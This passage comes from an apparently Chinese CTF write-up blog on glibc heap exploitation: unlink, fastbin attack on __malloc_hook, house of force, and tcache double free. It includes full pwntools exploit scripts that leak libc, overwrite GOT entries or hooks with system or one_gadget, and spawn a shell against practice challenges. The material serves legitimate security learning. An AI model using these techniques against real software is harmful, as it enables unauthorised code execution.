0x8(next_size)不用管，用’a’填充）</p><p><strong>chunk1:0x80</strong>（至少为0x80，能分配到unsortbin）</p><p><strong>chunk2:0x20</strong>（任意大小，防止与topchunk合并）</p><p>2.在chunk0中伪造一个fake_chunk</p><p>target=存指针数组的地方</p><p>（fd与bk要满足在指针数组中构成双向链表，把指针数组看成chunk，我这边成为指针数组chunk）</p><p>fd=target-0x18#要构成双向链表，fd存的是前一个指针数组chunk的prevsize地址，而fake_chunk相对前一个指针数组chunk是后一个chunk，所以前一个指针数组chunk的fd处（即target-0x18）要为fake_chunk的addr</p><p>bk=target-0x10#与上面类似，因为是bk，所以只要填target-0x100x10</p><p>（fake_chunk与指针数组chunk构成双向链表，利用指针数组里存的fake_chunk地址绕过检查）</p><p>fake_chunk=p64(0)+p64(0x30)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=‘a’*0x10<br>fake_chunk+=p64(0x30)+p64(0x90) #溢出修改chunk1的prev_size=30,size=90</p><p><strong>chunk状态检查</strong>：</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p><p>这样写就绕过了检查，让它以为是个空闲的块</p><p>3.释放那个unsortbin大小的chunk1，触发unlink,（把fake_chunk从双向链表中摘除，但由于组成双向链表的都是指针数组chunk，他们的fd与bk重新赋值后还是在指针数组那里，而且改了同一个地方两次，最后效果就是把chunk0的指针数组地址改为了指针数组地址附近，就可以对指针数组进行chunk的操作）</p><p>4.编辑chunk0，使指针指向atoi的got表地址，泄露got表</p><p>5.计算出libc_base和system</p><p>6.编辑chunk0把got表地址改为system地址，以后要调用atoi就调用了system</p><p>7.找到程序下一个要填atoi参数的地方，填入/bin/sh\x00，开shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2</span><br>target = <span class="hljs-number">0x06020C8</span><br>fd = target-<span class="hljs-number">0x18</span><br>bk = target-<span class="hljs-number">0x10</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>fake_chunk+=p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_chunk),fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>pd=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pd),pd)<br>show()<br>ru(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>atoi_got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(atoi_got)<br><span class="hljs-comment">#------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;atoi&#x27;</span>,atoi_got)<br>base=atoi_got-obj.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2</span><br>target = <span class="hljs-number">0x06020C8</span><br>fd = target-<span class="hljs-number">0x18</span><br>bk = target-<span class="hljs-number">0x10</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)<br>fake_chunk+=p64(fd)+p64(bk)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>fake_chunk+=p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(fake_chunk),fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>pd=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(pd),pd)<br>show()<br>ru(<span class="hljs-string">&#x27;0 : &#x27;</span>)<br>free_got=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(free_got)<br><span class="hljs-comment">#------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_got)<br>base=free_got-obj.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="另一种faskbin-attack做法">另一种faskbin attack做法</h4><p>（用了unsortbin的一个性质）</p><p>1.申请如下chunk</p><p>2.堆溢出chunk0修改chunk1的size使其覆盖chunk1，chunk2</p><p>3.free(1)后（误使他释放到了unsortbin中），再申请回来原来的大小，就会使main_arena附近的地址跑到chunk2中</p><p>4.show一下接受chunk2里面泄露的地址addr</p><p>5.libc_base=addr-88-libc.sym[‘__malloc_hook’]-0x10</p><p>​     或 libc_base=addr-88-main_arena</p><p>（main_arena的值 ，可以去ida查看libc文件里malloc_trim函数v22变量的值）</p><p>6.og=base+og</p><p>7.释放chunk1后 堆溢出chunk0修改fd为malloc_hook-0x23</p><p>(malloc_hook-0x23是因为那边有个7f可以用来绕过chunk的检查)</p><p>8.申请两次0x60大小的chunk，第二次申请的chunk就在malloc_hook-0x23处了</p><p>9.在这个chunk把malloc_hook覆写为og</p><p>ps:有时og打不通，可用og+realloc结合的方法测试过去,</p><p>10.最后结果就是要执行malloc的话，带动malloc的hook函数实际为og，就会开shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<span class="hljs-comment">#2 </span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>)<span class="hljs-comment">#3 防止前一个释放后与topchunk合并</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>show()<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>main_arena=<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>base=addr-<span class="hljs-number">88</span>-main_arena<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc=base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>shell=base+o_g_old[<span class="hljs-number">1</span>]<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(shell)+p64(realloc+<span class="hljs-number">10</span>))<br>sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sa(<span class="hljs-string">&#x27;Please enter the length of item name:&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="house-of-force做法：">house of force做法：</h4><h5 id="利用条件：">利用条件：</h5><ol><li>需要有办法能够更改到top chunk大小；</li><li>需要能够知道当前位置和要写位置的差值；</li><li>需要能够自由控制将要分配的chunk的大小，也就是malloc的参数值。</li></ol><h5 id="条件检测：">条件检测：</h5><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Check if a request is so large that it would wrap around zero when</span><br><span class="hljs-comment">   padded and aligned. To simplify some other code, the bound is made</span><br><span class="hljs-comment">   low enough so that adding MINSIZE will also not wrap around zero.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span><br><span class="hljs-meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span><br><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><br><span class="hljs-comment">/*  Same, except also perform argument check */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> checked_request2size(req, sz)                                          \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span><br><span class="hljs-meta">        __set_errno(ENOMEM);                                                   \</span><br><span class="hljs-meta">        return 0;                                                              \</span><br><span class="hljs-meta">    &#125;                                                                          \</span><br><span class="hljs-meta">    (sz) = request2size(req);</span><br></code></pre></td></tr></table></figure><p>1.req要小于-2*MINSIZE，一般取负值应该都能满足</p><p>2.(req) + SIZE_SZ + MALLOC_ALIGN_MASK 的值要大于MINSIZE</p><p>即申请的size要大于MINSIZE</p><h5 id="偏移测定："><strong>偏移测定：</strong></h5><p><strong>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</strong></p><p>因为size=(req) + SIZE_SZ + MALLOC_ALIGN_MASK</p><p>我们若要申请-0x60大小,参数req就要设置为</p><p>req=-0x60-SIZE_SZ- MALLOC_ALIGN_MASK</p><p>ps：这里0x60是16位对齐的，如果不对齐的话还要考虑源码中</p><p>(req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 的操作</p><p>（<strong>&amp;是按位与</strong> <strong>~是 取非）</strong></p><h5 id="本题具体步骤：">本题具体步骤：</h5><p>1.申请0x30大小堆块，查看top chunk的top指针（本题可得为0xfc7060）</p><p>2.堆溢出修改top chunk size 为0xffffffffffffffff，使得我们能申请负数大小的chunk</p><p>（size会被强转成无符号整数，负数会变为极大值）</p><p>3.我们所要修改top指针为0xfc7000，可得相差大小为-0x60</p><p>申请的参数size大小设置为-0x60-0x8-0xf</p><p>4.申请这个大小的堆块后top指针变为了0xfc7000</p><p>5.再申请堆块就会在0xfc7000的位置申请，我们这里顺便填入后门函数magic的地址</p><p>6.选用5选项本该调用gogdebye却调用了后门函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">magic = <span class="hljs-number">0x400d49</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-number">0x30</span> * <span class="hljs-string">&#x27;a&#x27;</span><br>payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">8</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x41</span>,payload)<br>offest=-(<span class="hljs-number">0x60</span>+<span class="hljs-number">0x8</span>+<span class="hljs-number">0xf</span>)<br>add(offest,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(magic) * <span class="hljs-number">2</span>)<br>debug()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-en-3">ciscn_2019_en_3</h3><h4 id="查看保护：">查看保护：</h4><p>保护全开，多了一个fortify，%n$x类型的fmt利用会被拦截</p><h4 id="大致思路：">大致思路：</h4><p>泄露libc，然后double_free改free_hook为system，开shell</p><h4 id="exp：">exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ciscn_2019_en_3&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27964</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Input your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the size of story: \n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;please inpute the story: \n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Input your choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input the index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------</span><br>sla(<span class="hljs-string">&#x27;What\&#x27;s your name?\n&#x27;</span>,<span class="hljs-string">&#x27;nq&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Please input your ID.\n&#x27;</span>,<span class="hljs-string">&#x27;pppppppp&#x27;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;setbuffer&#x27;</span>]-<span class="hljs-number">231</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;libc_base=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base)<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;pppp&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x60</span>,p64(free_hook))<br>add(<span class="hljs-number">0x60</span>,p64(free_hook))<br>add(<span class="hljs-number">0x60</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>最后，那个有fortify保护，好像也能利用来泄露<br>参考师傅：<a href="https://www.cnblogs.com/remon535/p/14122719.html">https://www.cnblogs.com/remon535/p/14122719.html</a></p><h3 id="icoctf-2018-are-you-root">icoctf_2018_are you root</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121140324?spm=1001.2014.3001.5502">picoctf_2018_are you root_Nqoinaen的博客-CSDN博客</a><br>程序功能到达level5能打出flag，正常运行的话不会让你到达level5</p><h4 id="直接说解法：">直接说解法：</h4><p>就是输name的我们填满8个a，然后就可以改到level参数<br>strdup会把name copy下去，包括level参数，我们free它的话，释放到tcachebin0x20，level参数还在，我们再login的话，如果是0x20大小，就从tcachebin中取，level参数未初始化，还是5。就能接受flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./PicoCTF_2018_are_you_root&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29317</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;login aaaaaaaa&#x27;</span>+p64(<span class="hljs-number">5</span>))<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;reset&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;login aaaa&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;get-flag&#x27;</span>)<br><span 